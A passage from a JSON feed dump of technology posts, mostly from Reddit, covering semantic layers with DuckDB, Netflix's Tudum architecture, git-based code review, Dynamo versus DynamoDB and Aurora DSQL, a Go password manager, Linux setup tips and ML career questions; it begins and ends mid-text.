landscape?</strong></p></blockquote><p>Modern data stacks usually come with a handful of tools. A semantic layer most often reduces complexity in a large organization by eliminating metric duplication across those tools.</p><p>The initial setup cost pays for itself when you're not debugging why revenue numbers differ between Tableau and your web app.</p><blockquote><p><strong>What if my data changes frequently? Won't the semantic layer become a bottleneck for updates?</strong></p></blockquote><p>This is a strength of semantic layers. Unlike pre-computed aggregation tables that need to be reprocessed when source data changes, semantic layers generate queries on demand. Your metrics automatically reflect the latest data because they're calculated in real-time from the source. You only need to update the YAML definitions when business logic changes, not when data refreshes.</p><p>And it can make the process more agile than maintaining dozens of dbt models for different granularities.</p><blockquote><p><strong>What if I want to use MCP with it?</strong></p></blockquote><p>If you wish to add <a href=\"https://motherduck.com/blog/faster-data-pipelines-with-mcp-duckdb-ai/\">Model Context Protocol (MCP)</a> with Claude Code, for example, the boring semantic layer is built out of the box with it in combination with <a href=\"https://github.com/xorq-labs/xorq\">xorq</a>. Check out a quick showcase in this <a href=\"https://www.linkedin.com/posts/sven-gonschorek-16b5b0177_i-didnt-expect-connecting-a-data-warehouse-activity-7359199238884417537-En3D\">LinkedIn demo</a> by Sven Gonschorek.</p><p>You can also check out the <a href=\"https://github.com/boringdata/boring-semantic-layer#model-context-protocol-mcp-integration\">repo for further information</a> with <code>uv add 'boring-semantic-layer[mcp]'</code>. But in this article, I focus on the semantic layer capabilities first, and the importance of using one.</p><blockquote><p><strong>What are other popular semantic layer tools?</strong></p></blockquote><p>Cube, AtScale, dbt Semantic Layer, GoodData. Some of these tools are more powerful than others; not all support enhanced security, low-level security, or powerful APIs like Excel or caching. I curate a small list of these tools at <a href=\"https://www.ssp.sh/brain/semantic-layer#semantic-layer-tools\">Semantic Layer Tools</a>.</p><blockquote><p><strong>How do I use a semantic layer with MotherDuck?</strong></p></blockquote><p>Here are a couple of integrations that work out of the box:</p></section><section><p>I hope you enjoyed this article, which provided a practical illustration of how to use a semantic layer with DuckDB and MotherDuck.</p><p>The beauty of semantic layers lies in their empowering approach to working with metrics, complemented by advanced features, but also with a simple solution like we implemented here. With just a YAML file and a few lines of Python, we've created a system that can serve consistent metrics across any tool in your data stack. Whether you're building dashboards, training ML models, or enabling AI assistants, your business logic stays in one place while your analytics capabilities grow everywhere else.</p><p>Start with something simple, like the Boring Semantic Layer and DuckDB, and prove the value by addressing your most painful metric inconsistencies. Then, scale from there.</p><p>Future you and your coworkers will thank you when \"revenue\" and \"profit\" mean the same thing in every tool, all the time.</p></section>","contentLength":24454,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw7szt/why_semantic_layers_matter_and_how_to_build_one/"},{"title":"Go compiler optimization question?","url":"https://www.reddit.com/r/golang/comments/1mw7918/go_compiler_optimization_question/","date":1755772412,"author":"/u/Resident-Arrival-448","guid":235706,"unread":true,"content":"<div><pre><code>type T struct{ nextSibling *T } </code></pre><p>If a struct have pointers to it's own type does Go tries to allocate that struct(nextSibling) adjacent to original struct if the memory adjacent to it was free. If this happens it's a big performance optimization.</p></div>   submitted by   <a href=\"https://www.reddit.com/user/Resident-Arrival-448\"> /u/Resident-Arrival-448 </a>","contentLength":288,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Weekly: This Week I Learned (TWIL?) thread","url":"https://www.reddit.com/r/kubernetes/comments/1mw6ocf/weekly_this_week_i_learned_twil_thread/","date":1755770418,"author":"/u/gctaylor","guid":235615,"unread":true,"content":"<p>Did you learn something new this week? Share here!</p>","contentLength":50,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Netflix Revamps Tudum’s CQRS Architecture with RAW Hollow In-Memory Object Store","url":"https://www.infoq.com/news/2025/08/netflix-tudum-cqrs-raw-hollow/","date":1755768576,"author":"/u/rgancarz","guid":235617,"unread":true,"content":"<p>Netflix launched Tudum, its official fan website, in late 2021, to provide a destination for Netflix users interested in additional content associated with the company’s shows. The architecture of the website was initially based on the <a href=\"https://learn.microsoft.com/en-us/azure/architecture/patterns/cqrs\">Command Query Responsibility Segregation (CQRS)</a> pattern to optimize read performance for serving content.</p><p>The write part of the platform was built around the 3rd-party CMS product, and had a dedicated ingestion service for handling content update events, delivered via a webhook. The ingestion service was responsible for converting CMS data into read-optimized page content by applying templates, as well as data validations and transformations. Read-optimized data would then be published to a dedicated Kafka topic.</p><p>On the query side, the page data service was responsible for consuming messages for the Kafka topic and storing the data in the <a href=\"https://cassandra.apache.org/_/index.html\">Cassandra</a> query database. The service utilized a near cache to improve performance, providing stored page data to the page construction service and other internal services.</p><p>The initial architecture benefited from the decoupling of read and write paths, allowing for independent scaling. However, due to the caching refresh cycle, CMS updates were taking many seconds to show up on the website. The issue made it problematic for content editors to preview their modifications and got progressively worse as the amount of content grew, resulting in delays lasting tens of seconds.</p><p><a href=\"https://www.linkedin.com/in/eugeneemelyanov/\">Eugene Yemelyanau</a>, technology evangelist, and <a href=\"https://www.linkedin.com/in/jake-grice/\">Jake Grice</a>, staff engineer at Netflix, describe the cause for delays in retrieving content for displaying due to caching:</p><blockquote><p>Regardless of which system modifies the data, the cache is updated with each refresh cycle. If you have 60 keys and a refresh interval of 60 seconds, the near cache will update one key per second. This was problematic for previewing recent modifications, as these changes were only reflected with each cache refresh. As Tudum’s content grew, cache refresh times increased, further extending the delay.</p></blockquote><p>Eventually, the team decided to revamp the architecture to eliminate the delays in previewing content updates, ideally. Engineers chose to leverage <a href=\"https://hollow.how/\">RAW Hollow</a>, a homegrown in-memory object database. Netflix designed the database to handle small to medium datasets and support strong read-after-write consistency. RAW Hollow allows the entire dataset to reside in the memory of each application process within a cluster, offering low latency and high availability. The database provides eventual consistency by default but supports strong consistency at the individual request level.</p><p>Tudum engineers replaced Kafka and Cassandra with the RAW Follow cluster, spanning the ingestion and page construction service instances. The team concluded that, for the use case at hand, the CQRS design pattern wasn’t the optimal approach, and using a distributed, in-memory object store suited the situation better. The new solution eliminated cache invalidation problems as the entire dataset could fit into the application’s memory, helped by Hollow’s data compression, reducing the data size to 25% of the uncompressed size in the Apache Iceberg table.</p><p>As a result of the architecture revamp and supporting data migration, the platform benefited from a significant reduction in data propagation times and page construction due to reduced request I/O and round-trip times. Tudum engineers believe that the new architecture offers the best of both worlds for editors and visitors.</p><p>\nFollowing the publication, this news article generated a fair number of comments on <a href=\"https://news.ycombinator.com/item?id=44924261\">Hacker News</a> and <a href=\"https://www.reddit.com/r/softwarearchitecture/comments/1mtk8ki/netflix_revamps_tudums_cqrs_architecture_with_raw/\">Reddit</a>. Many HN and Reddit users questioned whether the CQRS pattern was justified for the Tudum website in the first place, and others&nbsp;offered alternative approaches for the overall architecture of Tudum.</p><div><div data-id=\"author-Rafal-Gancarz\"><a href=\"https://www.infoq.com/profile/Rafal-Gancarz/\" aria-label=\"Rafal Gancarz\"></a></div></div>","contentLength":3808,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw66im/netflix_revamps_tudums_cqrs_architecture_with_raw/"},{"title":"Look at my Passy (I have made a password manager =)","url":"https://www.reddit.com/r/golang/comments/1mw5gfo/look_at_my_passy_i_have_made_a_password_manager/","date":1755765793,"author":"/u/SpaceAirship","guid":235618,"unread":true,"content":"<p>Hi! While being in between jobs and having some free time, I have made my tiny Passy: a console app to manage and securely store passwords. If you’re brave enough, you can even store the encrypted data in a Git repo and access it from anywhere that has Passy installed. <a href=\"https://github.com/koss-null/passy\">GH link</a></p><p>Right now it’s a CLI tool, but I’m actively implementing an interactive console interface and planning a web UI so it can be used as a self-hosted server app. Currently I keep my passwords on a local Git server, but in theory you can store them on GitHub — Passy uses strong AES encryption. </p><p>I’d appreciate any feature suggestions to make this project more useful, and contributions are very welcome (especially if you can develop some web). Don't forget to press on a star if you like it =)</p>","contentLength":777,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Need help to find the right service.","url":"https://moti90.github.io/ibisimulator/","date":1755765488,"author":"/u/MachineMoti","guid":235601,"unread":true,"content":"<p>I have a raw sketch for an app i want to have developed, so far its been me and chatgpt ve rsion 5. i test and comment, and the coding gets done by the ai. <a href=\"https://moti90.github.io/ibisimulator/\">https://moti90.github.io/ibisimulator/</a></p><p>But ive started encountering problems now, i run a web2view environment, and have limited experience.</p><p>RIght now i have an index.html file with most of the code in it.</p><p>what could possible be the way for me to proceed? </p><p>my preference would be an ai that would be able to read,edit and write the code to that one file. and give me a download? then i can open that file, and test and comment</p>","contentLength":578,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw5dl5/need_help_to_find_the_right_service/"},{"title":"The Algorithm Behind Rate Limiting (Token Bucket in 100 Seconds)","url":"https://www.youtube.com/watch?v=my5dGtncxfw","date":1755765119,"author":"/u/xplodivity","guid":235600,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw5a85/the_algorithm_behind_rate_limiting_token_bucket/"},{"title":"\"GPT-5 just casually did new mathematics ... It wasn't online. It wasn't memorized. It was new math.\"","url":"https://www.reddit.com/r/artificial/comments/1mw5512/gpt5_just_casually_did_new_mathematics_it_wasnt/","date":1755764559,"author":"/u/MetaKnowing","guid":235705,"unread":true,"content":"<p>Can't link to the detailed proof since X links are I think banned in this sub, but you can go to @ SebastienBubeck's X profile and find it</p>","contentLength":138,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Linux for a general use - it's ready","url":"https://www.reddit.com/r/linux/comments/1mw4siv/linux_for_a_general_use_its_ready/","date":1755763212,"author":"/u/makshub","guid":235650,"unread":true,"content":"<p>I've been Linux-curious for the past 25 years. Always ended up switching back to Windows or Mac — either because of hardware issues, app support, or just the pain of troubleshooting (too many variables, nothing really \"mainstream\").</p><p>But in the past few months... I switched all my laptops to Linux. So, what changed?</p><p>Most of what I do is in the browser anyway.</p><p>The few apps I need are there and working: Signal, Spotify, OnlyOffice (MS Office replacement).</p><p>Hardware support turned out to be great.</p><p>First test: an old Huawei MateBook that struggled with Windows 10 and wasn’t even allowed to upgrade to 11. Installed Linux Mint → suddenly the machine flies. Temps are great, system is super fast, everything loads instantly. As a media/web machine for the kids? Perfect.</p><p>Next step: replaced Windows with Mint on my wife's Lenovo Yoga Slim 14. Same result. She didn’t even notice the switch — she basically just uses the browser anyway.</p><p>Troubleshooting? Honestly, using ChatGPT was a game-changer. Every time I had questions, I got clear answers, tweaked settings, and everything just worked.</p><p>Then came the big decision: I needed a proper laptop for freelancing. My first instinct? A new MacBook 😅 But after a long debate with ChatGPT, I ended up grabbing a sweet deal on an HP EliteBook. Chat did the research, confirmed Linux compatibility, and even suggested Fedora Workstation instead of Mint.</p><p>And to my surprise — even the fingerprint reader worked out of the box (right after install).</p><p>👉 If you’re a light/office user and comfortable asking ChatGPT for help: just go with Linux.</p>","contentLength":1592,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[R] How to prime oneself for ML research coming from industry","url":"https://www.reddit.com/r/MachineLearning/comments/1mw4sgp/r_how_to_prime_oneself_for_ml_research_coming/","date":1755763206,"author":"/u/Mission-Balance-4250","guid":235670,"unread":true,"content":"<p>I've been working as an ML Engineer for the last 5-6 years across a few different industries and have landed a job as a research engineer at a university under an esteemed supervisor in the NLP department who has generously offered to help me figure out my research interests and assist with theirs. I published a paper about 4 years ago in cognitive science - but it involved very little ML.</p><p>I don't have any tertiary qualifications/degrees but have industry experience in research-oriented roles - although, none primarily in NLP. I move internationally for the role in 3 months and want to poise myself to be as useful as possible. Does anyone have tips about gearing up to do academic research/engineering having come from industry?</p><p>I feel like there is infinite ground to cover; my maths will need much sharpening, I'll need to learn how to properly read scientific papers etc.</p>","contentLength":880,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Kubernetes Podcast episode 258: LLM-D, with Clayton Coleman and Rob Shaw","url":"https://www.reddit.com/r/kubernetes/comments/1mw4roy/kubernetes_podcast_episode_258_llmd_with_clayton/","date":1755763122,"author":"/u/kubernetespodcast","guid":235954,"unread":true,"content":"<div><p>This week we talk to Clayton Coleman and Rob Shaw about LLM-D</p><p>LLM-D is a Kubernetes-native high-performance distributed LLM inference framework. We covered the challenges the framework solves and why LLMs are not your typical web apps</p></div>   submitted by   <a href=\"https://www.reddit.com/user/kubernetespodcast\"> /u/kubernetespodcast </a>","contentLength":273,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Optimising Docker Images: A super simple guide","url":"https://www.reddit.com/r/kubernetes/comments/1mw48eo/optimising_docker_images_a_super_simple_guide/","date":1755761070,"author":"/u/bustedchalk","guid":235599,"unread":true,"content":"","contentLength":0,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Code Review Can Be Better","url":"https://tigerbeetle.com/blog/2025-08-04-code-review-can-be-better/","date":1755758574,"author":"/u/Xadartt","guid":235575,"unread":true,"content":"<p>Slightly unusual genre today: a <a href=\"https://github.com/tigerbeetle/tigerbeetle/pull/3129\">negative\nresult</a> about our <a href=\"https://github.com/tigerbeetle/tigerbeetle/pull/2732\"></a>\ntool for a different take on code review process, which we decided to\nshelve, at least for the time being.</p><p>A lot of people are unsatisfied with GitHub’s code review process.\nOne of the primary issues is that GitHub poorly supports stacked pull\nrequests and <a href=\"https://gist.github.com/thoughtpolice/9c45287550a56b2047c6311fbadebed2\">interdiff\nreviews</a>. While I also see interdiff as valuable, it’s not the reason\nwhy I decided to experiment with . I have two\nother problems with GitHub, and with every single other code review\nsystem, with the exception of <a href=\"https://www.janestreet.com/tech-talks/janestreet-code-review/\">the\nthing that Jane Street uses internally</a>:</p><ul><li>review state is not stored as a part of repository itself,</li><li>review is done via remote-first web-interface.</li></ul><p>Let’s start with the second one.</p><p>By the way of analogy, I don’t use GitHub’s web editor to write code.\nI clone a repository locally, and work in my editor, which is:</p><ul><li>fully local, memory/nvme latencies, no HTTP round-trips,</li><li>tailored to my specific odd workflow.</li></ul><p>When I review code, I like to pull the source branch locally. Then I\nsoft-reset the code to mere base, so that the code looks as if it was\nwritten by me. Then I fire up magit, which allows me to effectively\nnavigate both through the diff, and through the actual code. And I even\nuse git staging area to mark files I’ve already reviewed:</p><p>Reviewing  rather than diff is so powerful: I can run\nthe tests, I can go to definition to get the context, I can try out my\nrefactoring suggestions in-place, with code completion and the other\naffordances of my highly sophisticated code editor.</p><p>Alas, when I want to actually leave feedback on the PR, I have to\nopen the browser, navigate to the relevant line in the diff, and (after\nwaiting for several HTTP round-trips) type my suggestion into a text\narea. For some reason, the text area also regularly lags for me,\nespecially on larger diffs.</p><p>Two things are wrong here. On the interface side, review feedback is\ntext related to the code. The most natural interface is to just leave\nreview comments as inline comments in the code, or even to fix the code\ndirectly:</p><div><pre><code></code></pre></div><p>And on the implementation side, because the data is stored in a\nremote database, rather than in a local git repository, we get all those\nlatency-inducing round-trips (not to mention vendor lock in).</p><ul><li>Code review is a single commit which sits on top of the PR\nbranch.</li><li>That commit adds a bunch of code comments with specific\nmarkers.</li><li>Review process involves both the author and the reviewer modifying\nthis top commit (so, there’s a fair amount of\n<code>git push --force-with-lease</code> involved).</li><li>The review concludes when all threads were marked as\n and an explicit revert commit is added on top\n(such that review is preserved in the history).</li></ul><p>I had a hope that “code review is just a commit” would be the secret\nto keep implementation complexity low. Sadly, the devil is in the\ndetails in this particular case.</p><p>The basic idea, that reviewing is leaving comments in code, works as\nwell as I had expected (that is, it’s really, really awesome). But\nmodifying code under review turned out to be tricky. If a reviewer\nrequests a change, and you apply it to some deep commit, or even add a\nnew commit on top, you now have to solve mere conflicts with the review\ncomments themselves, as they are often added at the <a href=\"https://git-scm.com/book/en/v2/Git-Tools-Interactive-Staging\">hunk</a>\nboundaries. And then, while  is workable,\nit also adds friction. There is an impedance mismatch here, where, for\ncode, we want very strong, hash-chained intentional sequence of\nstate-transitions, while for review we would be more happy with more lax\nconflict-free merging rules. It  be solved with more\ntooling to “push” and “pop” review comments on top of pristine review\nbranch, but that seems to push well beyond my 500 line limit.</p><p>Then, there’s a second change. It seems like <a href=\"https://lore.kernel.org/git/CAESOdVAspxUJKGAA58i0tvks4ZOfoGf1Aa5gPr0FXzdcywqUUw@mail.gmail.com/T/#u\">upstream\ngit might be getting a Gerrit-style Change-Id</a> for tracking revisions\nof a single commit over rebases. If that happens, we might actually get\nfirst class support for per-commit interdiff review! But that would be\nsomewhat incompatible with  approach, which adds\nan entire separate commit to the branch. But, perhaps, in the\n world, we could be adding review comments to the\ncommits themselves, and, rather that adding a revert at the conclusion\nof review, instruct git to store all revisions of a particular\n.</p><p>Anyway, we are begrudgingly back to web-interface based code reviews\nfor now. Hopefully someone is inspired enough to fix this properly one\nday!</p><p>If you’ve been thinking along similar lines, the following links are\nworth checking out:</p><ul><li><a href=\"https://fossil-scm.org/home/doc/trunk/www/index.wiki\">Fossil</a>\nis an SCM system which stores everything in the repository.</li><li><a href=\"https://gerrit-review.googlesource.com/Documentation/note-db.html\">NoteDb</a>\nbackend for Gerrit. Gerrit started with tracking review state in a\nseparate database, but then moved storage into git.</li><li><a href=\"https://github.com/git-bug/git-bug\">git-bug</a> uses git to\nstore information about issues.</li><li><a href=\"https://doc.dxuuu.xyz/prr/index.html\">prr</a> which\nimplements in-editor review interface on top of GitHub’s Web API</li><li><a href=\"https://pr.pico.sh\">git-pr</a> similar project in spirit\nthat leverages git native features to replace the entire pull request\nworkflow.</li></ul>","contentLength":4928,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw3kd8/code_review_can_be_better/"},{"title":"Dynamo, DynamoDB, and Aurora DSQL","url":"https://brooker.co.za/blog/2025/08/15/dynamo-dynamodb-dsql.html","date":1755758202,"author":"/u/PragmaticFive","guid":235574,"unread":true,"content":"<p>People often ask me about the architectural relationship between <a href=\"https://www.allthingsdistributed.com/files/amazon-dynamo-sosp2007.pdf\">Amazon Dynamo</a> (as described in the classic 2007 SOSP paper), <a href=\"https://aws.amazon.com/dynamodb/\">Amazon DynamoDB</a> (the serverless distributed NoSQL database from AWS), and <a href=\"https://aws.amazon.com/rds/aurora/dsql/\">Aurora DSQL</a> (the serverless distributed SQL database from AWS). There’s a ton to say on the topic, but I’ll start off on comparing how the systems achieve a few key properties.</p><p>The key references for this post are:</p><p>The databases we’re looking at offer different levels of durability, but all three are designed not to lose data when a single host fails. Dynamo does this by taking advantage of its  approach, replicating the data across multiple hosts in order in the hash ring:</p><blockquote><p>To achieve high availability and durability, Dynamo replicates its data on multiple hosts. Each data item is replicated at N hosts. … Each key, k, is assigned to a coordinator node[]. The coordinator is in charge of the replication of the data items that fall within its range. In addition to locally storing each key within its range, the coordinator replicates these keys at the N-1 clockwise successor nodes in the ring.</p></blockquote><p>Like Dynamo, DynamoDB assigns a node in a hash ring to each individual item. But that’s where the similarities stop. Instead of replicating across multiple nodes in the ring, in DynamoDB each node consists of a replica group with multiple servers in multiple AZs using Paxos to replicate the data. Instead of appearing the ring  times, each item appears once, and takes advantage of fault-tolerant nodes rather than spreading over multiple nodes.</p><blockquote><p>Upon receiving a write request, the leader of the replication group for the key being written generates a write-ahead log record and sends it to its peer (replicas). A write is acknowledged to the application once a quorum of peers persists the log record to their local write-ahead logs.</p></blockquote><p>DynamoDB’s approach to durability has several advantages over Dynamo’s. First, because durability is based on replica sets and replica sets have much lower cardinality than keys, it’s much easier for the system to find and react to cases where there aren’t enough copies of a key and respond appropriately. Second, it doesn’t require a drop in durability during scale up or scale down: with Dynamo scaling changes the set of replicas for a key, with DynamoDB scaling is done by splitting or merging replica sets with no decrease in the number of copies.</p><p>DSQL is different from the other two. Like DynamoDB, it uses a Paxos variant to replicate a log of changes. Unlike DynamoDB, this is done with an additional component (the Journal), independent from the storage nodes. This brings the same benefits as DynamoDB, but additionally allows independent scaling of reads and writes, and cross-shard atomic commitment of changes. DSQL also (primarily) uses a range-based primary key sharding scheme, as opposed to Dynamo and DynamoDB’s hash-based schemes. The trade-offs between these choices are worth their own blog.</p><p>Dynamo offers only eventual consistency to clients.</p><blockquote><p>Dynamo provides eventual consistency, which allows for updates to be propagated to all replicas asynchronously.</p></blockquote><p>It does, however, spend some effort ensuring that replicas converge, and the paper somewhat confusingly also refers to this as consistency.</p><blockquote><p>To maintain consistency among its replicas, Dynamo uses a consistency protocol similar to those used in quorum systems. This protocol has two key configurable values: R and W. R is the minimum number of nodes that must participate in a successful read operation. W is the minimum number of nodes that must participate in a successful write operation. Setting R and W such that R + W &gt; N yields a quorum-like system.</p></blockquote><p>I’ll admit that I’m a little confused by the way  is treated here, because it doesn’t seem to align with the way the rest of the paper talks about consistency, and offers a path to stronger consistency as some Dynamo-inspired designs have achieved.</p><p>DynamoDB, by constrast, offers strongly consistent writes, and a choice of strongly consistent and eventually consistent reads. The choice approach is rather simple:</p><blockquote><p>Only the leader replica can serve write and strongly consistent read requests.</p></blockquote><blockquote><p>Any replica of the replication group can serve eventually consistent reads.</p></blockquote><p>This is a nice model, because it allows applications that can tolerate eventually consistent reads to opt in for reduced cost and latency, while keeping all writes strongly consistent (and avoiding all the complexity Dynamo has with vector clocks and object versioning, which come from accepting weak writes). It also offers strong consistency without application developers needing to understanding things like quorum (which, let’s be honest, most don’t).</p><p>DSQL, on the other hand, uses a combination of physical time and multi-version concurrency control to offer strong consistency for all reads and writes, even in long-running interactive transactions.</p><blockquote><p>To do that, we start every transaction by picking a transaction start time, $\\tau_{start}$. We use EC2’s <a href=\"https://docs.aws.amazon.com/AWSEC2/latest/UserGuide/set-time.html\">precision time infrastructure</a> which provides an accurate clock with strong error bounds. Then, for each read that the QP does to storage, it asks storage to do that read  $\\tau_{start}$. (from <a href=\"https://brooker.co.za/blog/2024/12/04/inside-dsql.html\">DSQL Vignette: Reads and Compute</a>)</p></blockquote><p>DSQL’s approach has two benefits over DynamoDB’s: strongly consistent reads can go to any storage replica, and strong consistency can be maintained even for interactive transactions, while never blocking writers. The cost of this is additional complexity, and the dependency on physical time. DSQL could offer weakly consistent reads with slightly lowered latency (by omitting the $\\tau_{start}$ check and simply reading the latest version of a key, for example), but currently doesn’t.</p><p>Dynamo is a simple key-value store, that doesn’t offer transactions of any kind:</p><blockquote><p>Dynamo does not provide any isolation guarantees and permits only single key updates.</p></blockquote><p>DynamoDB offers <a href=\"https://docs.aws.amazon.com/amazondynamodb/latest/developerguide/transaction-apis.html\">single-shot</a> serializable ACID transactions, with a single transaction consisting of multiple reads and writes. DSQL has the richest programming model, offering interactive transactions, full SQL support, and a rich type system.</p><p>The Dynamo paper makes a number of claims about the trade-offs between consistency, availability, and latency that have not stood the test of time. I’m not trying to  the paper authors (several are personal friends of mine, and many are long-time colleagues), but point out that we’ve learned a lot about building distributed databases in 20 years. Cloud infrastructure has also advanced considerably.</p><blockquote><p>Experience at Amazon has shown that data stores that provide ACID guarantees tend to have poor availability.</p></blockquote><p>This was true in the mid 2000s, but many ACID systems offer excellent availability today. That includes DynamoDB, DSQL, and others like Aurora Postgres. DynamoDB and DSQL can tolerate the failure of hosts, or an entire availability zone, without losing consistency, durability, or availability.</p><blockquote><p>From the very early replicated database works, it is well known that when dealing with the possibility of network failures, strong consistency and high data availability cannot be achieved simultaneously.</p></blockquote><p>Here, the Dynamo paper is citing <a href=\"https://dl.acm.org/doi/10.1145/1994.2207\">Bernstein and Goodman</a> (from 1984) and <a href=\"https://www.scribd.com/document/767274926/Notes-on-Distributed-Databases\">Lindsay et al</a> (from 1979) to highlight the inherent trade-offs between availability and consistency. These results aren’t in any way wrong, but (<a href=\"https://brooker.co.za/blog/2024/07/25/cap-again.html\">as I’ve argued before</a>), they aren’t as practically important as the Dynamo paper implies they are. Strongly consistent systems offer excellent availability in the face of failures of many kinds (<a href=\"https://brooker.co.za/blog/2024/12/06/inside-dsql-cap.html\">including entire region failures</a>).</p><p>Dynamo also allows applications to pick different trade-offs for performance, losing durability, consistency, or availability in the process.</p><blockquote><p>The main advantage of Dynamo is that its client applications can tune the values of N, R and W to achieve their desired levels of performance, availability and durability.</p></blockquote><p>This made complete sense in the mid-2000s. But better ways of thinking about replication and failure correlation, vastly improved system performance (thanks SSDs!), and much better datacenter networks have made this kinds of tunability uninteresting. It’s notable that both DynamoDB and DSQL offer significantly lower latencies than Dynamo while making none of the associated trade-offs discussed in the paper.</p><p>The Amazon Dynamo paper is a classic. You should read it if you haven’t. But time has marched on, we’ve learned a ton, we’ve got better hardware and better ideas, and much of what the Dynamo paper says doesn’t make sense in the real world anymore. That’s a good thing!</p><ol><li> is doing some heavy lifting here, with other authors including Pat Selinger, Jim Gray, and Franco Putzolu.</li><li> See the discussion of  in the Dynamo paper, and think about what happens with infrequently-read keys.</li><li> When I say <em>strongly consistent writes</em> here, I mean three things. First, writes are applied in a per-key total order (or a cross-key total order in the case of <a href=\"https://www.usenix.org/conference/atc23/presentation/idziorek\">DynamoDB’s transactions</a>), meaning that there’s no post-commit merging of writes. Second, writes are applied atomically at the same logical time as their preconditions are evaluated, meaning that no other writes can sneak in between precondition evaluation and writes being committed. In this way, you can roughly think of even a basic DynamoDB  call as a strict serializable one-shot transaction. Third, a successful DynamoDB write is committed with full durability and synchronously replicated to the right number of replicas, unlike in Dynamo where writes are asynchronously replicated.</li><li> The exception being <a href=\"https://aws.amazon.com/dynamodb/global-tables/\">DynamoDB Global Tables</a> in eventual consistency mode, where  is used for conflict resolution and merging between writes from different regions. Global Tables also has a strong consistency mode, which avoids this post-merge.</li></ol>","contentLength":9818,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":"https://www.reddit.com/r/programming/comments/1mw3gso/dynamo_dynamodb_and_aurora_dsql/"},{"title":"[D] PhD vs startup/industry for doing impactful AI research — what would you pick?","url":"https://www.reddit.com/r/MachineLearning/comments/1mw2z1y/d_phd_vs_startupindustry_for_doing_impactful_ai/","date":1755756397,"author":"/u/Maleficent-Tone6316","guid":235576,"unread":true,"content":"<p>I’m deciding between starting a PhD at a top university (ranked ~5–10) with a great professor (lots of freedom, supportive environment) or going straight into industry.</p><p>My long-term goal is to work on the frontier of intelligence, with more focus on research than pure engineering. My background is mostly around LLMs on the ML side, and I already have a few A* conference papers (3–4), so I’m not starting from scratch.</p><p>Industry (likely at a smaller lab or startup) could give me immediate opportunities, including large-scale distributed training and more product-driven work. The lab I’d join for the PhD also has strong access to compute clusters and good chances for internships/collaborations, though in a more research-focused, less product-driven setting. The typical timeline in this lab is ~4 years + internship time.</p><p>If you were in this position, which path would you take?</p>","contentLength":891,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Just got a Samsung SCX-3405 (SCX-340x) working with CUPS on ARM (Raspberry Pi print server)","url":"https://www.reddit.com/r/linux/comments/1mw1lye/just_got_a_samsung_scx3405_scx340x_working_with/","date":1755751772,"author":"/u/CplHicks_LV426","guid":235704,"unread":true,"content":"<p>So there's lots of issues with old Samsung printers and ARM drivers. I fought with it for a while until I just started trying printer drivers in the list.</p><p>Connect USB printer to the Pi</p><p>add user to lpadmin group</p><p>enable web admin for CUPS</p><p>install Samsung Unified Linux Driver (apt install hplip printer-driver-splix )</p><p>add the printer in CUPS: go to web interface (<a href=\"http://pi.ip:631\">http://pi.ip:631</a>), go to Administration &gt; Add Printer</p><p>It will show SCX-3400 via USB</p><p>Select it, name it and click add printer</p><p>on the next page it will ask you for Make and Model. Make is Samsung, but SCX-3400 series is NOT in the list of Models. You have to choose SCX-3200. Add it.</p><p>From the CUPS web ui, select the printer you just added and go to Maintenance&gt; print test page</p>","contentLength":729,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"has anyone deployed ovn-kubernetes","url":"https://www.reddit.com/r/kubernetes/comments/1mvzoty/has_anyone_deployed_ovnkubernetes/","date":1755745751,"author":"/u/Mr-Freedom-1776","guid":235616,"unread":true,"content":"<p>It seems like the documentation is missing parts and its kept vague on purpose. Maybe because redhat runs it now. Has anyone deployed it? I run into all kinds of issues seemingly with FIPS/SELINUX being enabled on my hosts. All of their examples are with kind and their helm chart seems fairly inflexible. The lack of a joinable slack also sniffs of we really dont want anyone else running this. </p>","contentLength":396,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"[P] Vibe datasetting- Creating syn data with a relational model","url":"https://www.reddit.com/r/MachineLearning/comments/1mvycr9/p_vibe_datasetting_creating_syn_data_with_a/","date":1755741918,"author":"/u/OkOwl6744","guid":234860,"unread":true,"content":"<p>TL;DR: I’m testing the Dataset Director, a tiny tool that uses a relational model as a planner to predict which data you’ll need next, then has an LLM generate only those specific samples. Free to test, capped at 100 rows/dataset, export directly to HF.</p><p>Why: Random synthetic data ≠ helpful. We want on-spec, just-in-time samples that fix the gaps that matter (long tail, edge cases, fairness slices).</p><p>How it works: 1. Upload a small CSV or connect to a mock relational set.</p><pre><code>2. Define a semantic spec (taxonomy/attributes + target distribution). 3. KumoRFM predicts next-window frequencies → identifies under-covered buckets. 4. LLM generates only those samples. Coverage &amp; calibration update in place. </code></pre><p>What to test (3 min): • Try a churn/click/QA dataset; set a target spec; click Plan → Generate.</p><pre><code>• Check coverage vs. target and bucket-level error/entropy before/after. </code></pre><p>Limits / notes: free beta, 100 rows per dataset; tabular/relational focus; no PII; in-memory run for the session.</p><p>Looking for feedback, like: • Did the planner pick useful gaps? • Any obvious spec buckets we’re missing? • Would you want a “generate labels only” mode? • Integrations you’d use first (dbt/BigQuery/Snowflake)?</p>","contentLength":1221,"flags":null,"enclosureUrl":"","enclosureMime":"","commentsUrl":null},{"title":"Found out that Walmart uses 